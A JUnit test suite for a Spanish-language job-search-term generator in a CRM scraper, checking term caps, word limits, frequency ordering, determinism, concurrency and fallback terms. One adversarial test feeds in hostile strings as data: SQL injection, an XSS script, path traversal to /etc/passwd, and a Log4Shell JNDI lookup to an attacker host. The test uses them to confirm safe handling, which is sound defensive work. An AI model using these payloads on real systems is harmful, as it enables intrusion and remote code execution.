package com.novacrm.scraper;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.RepeatedTest;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.NullSource;
import org.junit.jupiter.params.provider.ValueSource;

import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.Set;
import java.util.concurrent.Callable;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.concurrent.TimeUnit;
import java.util.stream.IntStream;

import static org.junit.jupiter.api.Assertions.*;

/**
 * Empirical Invariant, Stress, and Adversarial Fuzzing Test Suite
 * for TerminosDeBusqueda.java (Milestone 1).
 *
 * Authored by Empirical Challenger 2.
 */
class TerminosDeBusquedaInvariantStressTest {

    // =========================================================================
    // 1. INVARIANT: RESULT SIZE AND BUDGET CAP
    // =========================================================================
    @Nested
    @DisplayName("Invariant 1: Budget Cap (MAX_TERMINOS = 10)")
    class BudgetCapInvariantTests {

        @Test
        @DisplayName("Result list size is EXACTLY 10 across a wide variety of input sizes")
        void resultSizeNeverExceedsMaxTerminos() {
            // Test varying input sizes from 0 to 500
            for (int count : List.of(0, 1, 2, 5, 9, 10, 11, 20, 50, 100, 500)) {
                List<String> input = IntStream.range(0, count)
                        .mapToObj(i -> "Cargo Profesional " + i)
                        .toList();

                List<String> result = TerminosDeBusqueda.desdeEstudiantes(input, input);
                assertNotNull(result, "Result should never be null for count=" + count);
                assertEquals(TerminosDeBusqueda.MAX_TERMINOS, result.size(),
                        "Result size must equal MAX_TERMINOS (10) for input count=" + count);
                assertTrue(result.size() <= TerminosDeBusqueda.MAX_TERMINOS,
                        "Result size must never exceed MAX_TERMINOS (10)");
            }
        }

        @Test
        @DisplayName("Result list contains no duplicates")
        void resultListContainsNoDuplicates() {
            List<String> inputs = List.of(
                    "Desarrollador Java", "desarrollador java", "DESARROLLADOR JAVA",
                    "Contador", "contador publico", "Contador Bilingue",
                    "Ingeniero Civil", "ingeniero civil", "INGENIERO CIVIL");

            List<String> result = TerminosDeBusqueda.desdeEstudiantes(inputs, inputs, inputs, inputs, inputs);
            assertEquals(result.size(), Set.copyOf(result).size(),
                    "Result list must not contain duplicate search terms: " + result);
            assertEquals(10, result.size());
        }
    }

    // =========================================================================
    // 2. INVARIANT: INDIVIDUAL TERM WORD COUNT (<= 4 WORDS)
    // =========================================================================
    @Nested
    @DisplayName("Invariant 2: Individual Term Word Count (<= 4 words)")
    class WordCountInvariantTests {

        @Test
        @DisplayName("Every term in RESPALDO satisfies word count <= 4")
        void respaldoSatisfiesWordCount() {
            for (String term : TerminosDeBusqueda.RESPALDO) {
                int words = term.trim().split("\\s+").length;
                assertTrue(words <= 4,
                        () -> "Term in RESPALDO exceeds 4 words: '" + term + "' (" + words + " words)");
            }
        }

        @ParameterizedTest
        @ValueSource(strings = {
                "Ingeniero de Sistemas Computacionales Especializado en Arquitectura Cloud",
                "Director Ejecutivo de Planificacion Estrategica y Finanzas Corporativas Internacionales",
                "Senior Principal Lead Staff Software Development Engineer in Test",
                "Bilingual Senior Executive Vice President of Global Customer Support Operations",
                "Licenciado en Administracion de Empresas y Negocios Internacionales con Enfasis en Mercadeo",
                "Diseñador Grafico Digital Interactivo UI UX con Experiencia en Modelado Tridimensional",
                "VeryLongSingleWordWithoutAnySpacesThatExceedsNormalLengthLimits"
        })
        @DisplayName("Enriched terms from long phrases never exceed 4 words")
        void longPhrasesAreTrimmedToMaxFourWords(String longInput) {
            String enriched = TerminosDeBusqueda.enriquecerTermino(TerminosDeBusqueda.limpiar(longInput));
            assertNotNull(enriched);
            int words = enriched.trim().split("\\s+").length;
            assertTrue(words <= 4,
                    () -> "Enriched term exceeds 4 words: '" + enriched + "' (" + words + " words) from input: " + longInput);
        }

        @Test
        @DisplayName("Fuzzing test: 1,000 random composite phrases generate <= 4-word terms")
        void fuzzingRandomPhrasesWordCount() {
            String[] dictionary = {
                    "Senior", "Lead", "Junior", "Principal", "Software", "Cloud", "Data", "Security",
                    "Financial", "Marketing", "Business", "Graphic", "Industrial", "Systems", "Network",
                    "Engineer", "Developer", "Analyst", "Manager", "Consultant", "Director", "Architect",
                    "Specialist", "Administrator", "Coordinator", "Officer", "Expert", "Auditor", "Executive",
                    "Bilingual", "English", "B2", "C1", "Global", "International", "Remote", "Operations"
            };

            java.util.Random random = new java.util.Random(42);
            for (int i = 0; i < 1000; i++) {
                int phraseLen = 1 + random.nextInt(12);
                StringBuilder sb = new StringBuilder();
                for (int j = 0; j < phraseLen; j++) {
                    sb.append(dictionary[random.nextInt(dictionary.length)]).append(" ");
                }
                String candidate = sb.toString().trim();
                List<String> terms = TerminosDeBusqueda.trocear(candidate);
                for (String t : terms) {
                    String enriched = TerminosDeBusqueda.enriquecerTermino(t);
                    if (enriched != null) {
                        int wordCount = enriched.trim().split("\\s+").length;
                        assertTrue(wordCount <= 4,
                                () -> "Term '" + enriched + "' has " + wordCount + " words from candidate '" + candidate + "'");
                    }
                }
            }
        }
    }

    // =========================================================================
    // 3. INVARIANT: FREQUENCY ORDERING
    // =========================================================================
    @Nested
    @DisplayName("Invariant 3: Frequency Ordering (Monotonic Descending)")
    class FrequencyOrderingInvariantTests {

        @Test
        @DisplayName("Terms with higher frequency strictly precede terms with lower frequency")
        void higherFrequencyPrecedesLowerFrequency() {
            List<String> cargos = new ArrayList<>();
            // Frequency 100 for Contador
            for (int i = 0; i < 100; i++) cargos.add("Contador");
            // Frequency 50 for Disenador
            for (int i = 0; i < 50; i++) cargos.add("Disenador");
            // Frequency 20 for Medico
            for (int i = 0; i < 20; i++) cargos.add("Medico");
            // Frequency 5 for Abogado
            for (int i = 0; i < 5; i++) cargos.add("Abogado");

            List<String> terminos = TerminosDeBusqueda.porFrecuencia(cargos, List.of());

            assertTrue(terminos.size() >= 4);
            assertEquals("contador bilingue", terminos.get(0));
            assertEquals("disenador bilingue", terminos.get(1));
            assertEquals("medico bilingue", terminos.get(2));
            assertEquals("abogado bilingue", terminos.get(3));
        }

        @Test
        @DisplayName("Merged synonyms and normalized variants aggregate frequencies correctly")
        void mergedSynonymsAggregateFrequencies() {
            List<String> cargos = List.of(
                    "Contador",
                    "Contador Publico",
                    "contador bilingue",
                    "Contador Auditor",
                    "Desarrollador Java",
                    "Desarrollador Java"
            );

            // "Contador" -> "contador bilingue" (1)
            // "Contador Publico" -> "contador publico bilingue" (1)
            // "contador bilingue" -> "contador bilingue" (1)
            // "Contador Auditor" -> "contador auditor bilingue" (1)
            // "Desarrollador Java" -> "desarrollador java bilingue" (2)

            // "contador bilingue" has merged frequency 2, "desarrollador java bilingue" has frequency 2.
            List<String> terminos = TerminosDeBusqueda.porFrecuencia(cargos, List.of());
            assertNotNull(terminos);
            assertTrue(terminos.contains("contador bilingue"));
            assertTrue(terminos.contains("desarrollador java bilingue"));
        }
    }

    // =========================================================================
    // 4. INVARIANT: DETERMINISM & REPEATABILITY
    // =========================================================================
    @Nested
    @DisplayName("Invariant 4: Determinism and Repeatability")
    class DeterminismInvariantTests {

        @Test
        @DisplayName("1,000 repeated invocations with identical inputs yield strictly identical outputs")
        void thousandRepeatedRunsYieldIdenticalResults() {
            List<String> cargos = List.of("Full Stack Developer", "Data Scientist", "UI Designer", "Financial Analyst");
            List<String> sectores = List.of("Technology", "Finance", "Healthcare");
            List<String> titulos = List.of("Ingeniero de Software", "Contador");
            List<String> programas = List.of("Ingenieria Informatica", "Finanzas Internacionales");
            List<String> areas = List.of("Tecnologia", "Negocios");

            List<String> baseline = TerminosDeBusqueda.desdeEstudiantes(cargos, sectores, titulos, programas, areas);

            for (int i = 0; i < 1000; i++) {
                List<String> current = TerminosDeBusqueda.desdeEstudiantes(cargos, sectores, titulos, programas, areas);
                assertEquals(baseline, current, "Run #" + i + " deviated from deterministic baseline!");
            }
        }

        @Test
        @DisplayName("Concurrent execution from multiple threads is thread-safe and deterministic")
        void threadSafetyUnderConcurrentLoad() throws InterruptedException, ExecutionException {
            int threadCount = 32;
            int iterationsPerThread = 100;
            ExecutorService executor = Executors.newFixedThreadPool(threadCount);

            List<String> cargos = List.of("DevOps Engineer", "Marketing Specialist", "Scrum Master", "Product Owner");
            List<String> baseline = TerminosDeBusqueda.desdeEstudiantes(cargos, List.of("Tech"));

            CountDownLatch latch = new CountDownLatch(1);
            List<Future<Boolean>> futures = new ArrayList<>();

            for (int i = 0; i < threadCount; i++) {
                futures.add(executor.submit(() -> {
                    latch.await();
                    for (int j = 0; j < iterationsPerThread; j++) {
                        List<String> res = TerminosDeBusqueda.desdeEstudiantes(cargos, List.of("Tech"));
                        if (!baseline.equals(res)) {
                            return false;
                        }
                    }
                    return true;
                }));
            }

            latch.countDown();
            for (Future<Boolean> future : futures) {
                assertTrue(future.get(), "Concurrent invocation produced inconsistent output");
            }
            executor.shutdown();
            assertTrue(executor.awaitTermination(5, TimeUnit.SECONDS));
        }
    }

    // =========================================================================
    // 5. INVARIANT: COLD-START BALANCED MULTIDISCIPLINARY NUCLEUS
    // =========================================================================
    @Nested
    @DisplayName("Invariant 5: Cold-Start Balanced Nucleus")
    class ColdStartInvariantTests {

        @Test
        @DisplayName("Empty lists across all overloads return RESPALDO")
        void emptyInputsReturnRespaldo() {
            assertEquals(TerminosDeBusqueda.RESPALDO, TerminosDeBusqueda.desdeEstudiantes());
            assertEquals(TerminosDeBusqueda.RESPALDO, TerminosDeBusqueda.desdeEstudiantes(List.of(), List.of()));
            assertEquals(TerminosDeBusqueda.RESPALDO, TerminosDeBusqueda.desdeEstudiantes(
                    List.of(), List.of(), List.of(), List.of(), List.of()));
            assertEquals(TerminosDeBusqueda.RESPALDO, TerminosDeBusqueda.desdeEstudiantes(
                    List.of("", "   ", "\t\n"), List.of("/", ",; ")));
        }

        @Test
        @DisplayName("Null arguments across all overloads return RESPALDO")
        void nullInputsReturnRespaldo() {
            assertEquals(TerminosDeBusqueda.RESPALDO, TerminosDeBusqueda.desdeEstudiantes((List<String>[]) null));
            assertEquals(TerminosDeBusqueda.RESPALDO, TerminosDeBusqueda.desdeEstudiantes(null, null));
            assertEquals(TerminosDeBusqueda.RESPALDO, TerminosDeBusqueda.desdeEstudiantes(null, null, null, null, null));
        }

        @Test
        @DisplayName("RESPALDO has exactly 10 distinct multidisciplinary terms covering 7 key disciplines")
        void respaldoMultidisciplinaryCoverage() {
            assertEquals(10, TerminosDeBusqueda.RESPALDO.size());
            assertEquals(10, Set.copyOf(TerminosDeBusqueda.RESPALDO).size(), "RESPALDO must not have duplicates");

            // 1. Software / Dev
            assertTrue(TerminosDeBusqueda.RESPALDO.stream().anyMatch(t -> t.contains("desarrollador") || t.contains("software")));
            // 2. Data
            assertTrue(TerminosDeBusqueda.RESPALDO.stream().anyMatch(t -> t.contains("datos") || t.contains("analista")));
            // 3. Accounting / Finance
            assertTrue(TerminosDeBusqueda.RESPALDO.stream().anyMatch(t -> t.contains("contador")));
            // 4. Engineering
            assertTrue(TerminosDeBusqueda.RESPALDO.stream().anyMatch(t -> t.contains("ingeniero")));
            // 5. Design
            assertTrue(TerminosDeBusqueda.RESPALDO.stream().anyMatch(t -> t.contains("disenador")));
            // 6. Marketing
            assertTrue(TerminosDeBusqueda.RESPALDO.stream().anyMatch(t -> t.contains("marketing")));
            // 7. BPO / Customer Service / Support
            assertTrue(TerminosDeBusqueda.RESPALDO.stream().anyMatch(t -> t.contains("customer service") || t.contains("soporte")));
        }
    }

    // =========================================================================
    // 6. ADVERSARIAL & EDGE-CASE STRESS TESTING
    // =========================================================================
    @Nested
    @DisplayName("Adversarial & Edge Cases")
    class AdversarialEdgeCaseTests {

        @Test
        @DisplayName("Handles malicious input patterns, SQL injections, and script tags safely")
        void handlesMaliciousInputsSafely() {
            List<String> malicious = List.of(
                    "'; DROP TABLE estudiantes; --",
                    "<script>alert('XSS')</script>",
                    "SELECT * FROM usuarios WHERE 1=1",
                    "../../../../etc/passwd",
                    "${jndi:ldap://attacker.com/a}",
                    "{{7*7}}",
                    "NaN",
                    "null",
                    "undefined"
            );

            List<String> result = TerminosDeBusqueda.desdeEstudiantes(malicious, List.of());
            assertNotNull(result);
            assertEquals(10, result.size());
            // Verify no unhandled exceptions and all terms are well-formed strings
            for (String term : result) {
                assertNotNull(term);
                assertFalse(term.isBlank());
                assertTrue(term.split("\\s+").length <= 4);
            }
        }

        @Test
        @DisplayName("Handles high-cardinality dataset (10,000 records / 50,000 fields) efficiently")
        void highCardinalityPerformanceBenchmark() {
            int recordCount = 10000;
            List<String> cargos = new ArrayList<>(recordCount);
            List<String> sectores = new ArrayList<>(recordCount);
            List<String> titulos = new ArrayList<>(recordCount);
            List<String> programas = new ArrayList<>(recordCount);
            List<String> areas = new ArrayList<>(recordCount);

            String[] roles = {"Desarrollador", "Contador", "Disenador", "Ingeniero", "Marketing", "Soporte", "Analista", "Administrador"};
            String[] modifiers = {"Java", "Python", "Senior", "Junior", "Publico", "Grafico", "Industrial", "Comercial"};

            for (int i = 0; i < recordCount; i++) {
                String role = roles[i % roles.length];
                String mod = modifiers[i % modifiers.length];
                cargos.add(role + " " + mod);
                sectores.add("Sector " + (i % 20));
                titulos.add("Titulo " + role);
                programas.add("Programa " + mod);
                areas.add("Area " + (i % 10));
            }

            // Warmup execution
            TerminosDeBusqueda.desdeEstudiantes(cargos.subList(0, 500), sectores.subList(0, 500));

            // Benchmark execution
            long startTime = System.nanoTime();
            List<String> result = TerminosDeBusqueda.desdeEstudiantes(cargos, sectores, titulos, programas, areas);
            long elapsedNanos = System.nanoTime() - startTime;
            long elapsedMillis = TimeUnit.NANOSECONDS.toMillis(elapsedNanos);

            assertNotNull(result);
            assertEquals(10, result.size());
            // 50,000 string normalizations + tokenizations + frequency sorts should complete in < 1500ms
            assertTrue(elapsedMillis < 1500, "Processing 50,000 fields took " + elapsedMillis + "ms (should be < 1500ms)");
        }

        @Test
        @DisplayName("Ciudades method correctly limits to 5, removes duplicates, and trims whitespace")
        void ciudadesHandlesVariousScenarios() {
            List<String> input = List.of(
                    "  Barranquilla  ",
                    "Bogota",
                    "Medellin",
                    "Cali",
                    "Cartagena",
                    "Barranquilla",
                    "Bucaramanga",
                    "Pereira"
            );

            List<String> ciudades = TerminosDeBusqueda.ciudades(input);
            assertEquals(5, ciudades.size());
            assertEquals("Barranquilla", ciudades.get(0));
            assertEquals("Bogota", ciudades.get(1));
            assertEquals("Medellin", ciudades.get(2));
            assertEquals("Cali", ciudades.get(3));
            assertEquals("Cartagena", ciudades.get(4));
            assertEquals(5, Set.copyOf(ciudades).size(), "Cities list must have no duplicates");
        }
    }
}
